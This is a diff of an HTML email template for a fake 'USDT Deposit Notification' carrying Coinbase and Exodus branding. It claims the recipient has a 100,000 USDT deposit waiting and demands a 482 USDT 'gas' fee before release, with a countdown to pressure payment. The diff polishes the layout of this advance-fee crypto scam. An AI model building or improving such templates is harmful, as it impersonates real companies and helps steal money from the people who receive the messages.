@@ -1,16 +1,31 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <h2>USDT Deposit Notification</h2>
-</head>
-<body>
-<img src="IMG_0560.jpeg" alt="Coinbase" width="150" style="display:block; max-width:100%; height:auto;" />
+ <H2 align="center">USDT Deposit Notification</H2>
+ </head>
+<body style="margin:0; padding:0; background-color:#f6f9fc; font-family: Arial, sans-serif;">
 
-<h3 style="color:#333333; margin:0 0 10px 0; font-size:24px;">Deposit Received</h3>
-    <p style="font-size:16px; color:#555555; margin:0;">You've received a deposit of</p>
-    <p style="font-size:28px; color:#05a5f0; margin:20px 0;"><strong>100,000 USDT</strong></p>
+  <table role="presentation" cellpadding="0" cellspacing="0" width="100%" style="background-color:#f6f9fc; padding:20px 0;">
+    <tr>
+      <td align="center"> </td>
+        <table role="presentation" cellpadding="0" cellspacing="0" width="600" class="container" style="width:600px; background-color:#ffffff; border-radius:8px; overflow:hidden;">
+      
+      <!-- Header -->
+ 
+  <td align="center" style="padding: 20px;">
+              <img src="IMG_0560.jpeg" alt="Coinbase" width="150" style="display:block; max-width:100%; height:auto;" />
+            </td>
+          </tr>
 
-  <table style="margin: 0 auto; width: 90%; max-width: 400px; border-collapse: collapse; background-color: #ffffff; border-radius: 8px; box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);">
+          <!-- Body -->
+   <tr>
+            <td align="center" class="content" style="padding: 20px 40px;">
+              <h2 style="color:#333333; margin:0 0 10px 0; font-size:24px;">Deposit Received</h2>
+              <p style="font-size:16px; color:#555555; margin:0;">You've received a deposit of</p>
+              <p style="font-size:28px; color:#05a5f0; margin:20px 0;"><strong>100,000 USDT</strong></p>
+
+              
+<table style="margin: 0 auto; width: 90%; max-width: 400px; border-collapse: collapse; background-color: #ffffff; border-radius: 8px; box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);">
     <tr>
       <td style="padding: 10px; text-align: left; border-bottom: 1px solid #ddd;"><strong>Transaction Reference:</strong></td>
       <td style="padding: 10px; text-align: left; border-bottom: 1px solid #ddd;">e3019139-5efd-4ae1-ad70-b645454404f</td>
@@ -42,17 +57,23 @@
     </form>
     <span style="color: Green;"> And receive $100,000 USDT Balance on your USDT address</span>
 
-  <table style="margin: 0 auto; width: 90%; max-width: 400px; border-collapse: collapse; background-color: #ffffff; border-radius: 8px; box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);">
-    <tr>
-      <td style="padding: 10px; text-align: left; border-bottom: 1px solid #ddd;"><strong>TETHER GAS (estimated):[$482] = 482 USDT</strong></td>
-      <td style="padding: 10px; text-align: left; border-bottom: 1px solid #ddd;">CURRENTLY OUTSTANDING 482 USDT</td>
-    </tr>
-    <tr>
-      <td style="padding: 10px; text-align: left; border-bottom: 1px solid #ddd;"><strong>$0.00 USDT PAID</strong></td>
-</tr>
-  </table>
-    
-  <pre>
+<h4>GAS REFILL</h4>
+    <table style="color:#05a5f0; background-color:#f2f2f2;">
+      <tr>
+        <th colspan="2">TETHER GAS (estimated):</th>
+      </tr>
+      <tr>
+       <td>[$482] = 482 USDT</td>
+        <td>CURRENTLY OUTSTANDING 482 USDT</td>
+      </tr>
+      <tr>
+        <td colspan="2">
+          <p><span style="color: Green;">$0.00 USDT PAID</p></span>
+        </td>
+      </tr>
+    </table>
+
+<pre>
 <span style="color: green;">RECEIVING IN 15 seconds•••••</span>
     </pre>
     
@@ -124,5 +145,6 @@
  © 2025 Exodus.com, Inc. All rights reserved.<br/>
               ® PRIVACY POLICY
 
-             
+<td align="center">        
   <img src="IMG_0560.jpeg" alt="Coinbase" width="150" style="display:block; max-width:100%; height:auto;" />
+</td>
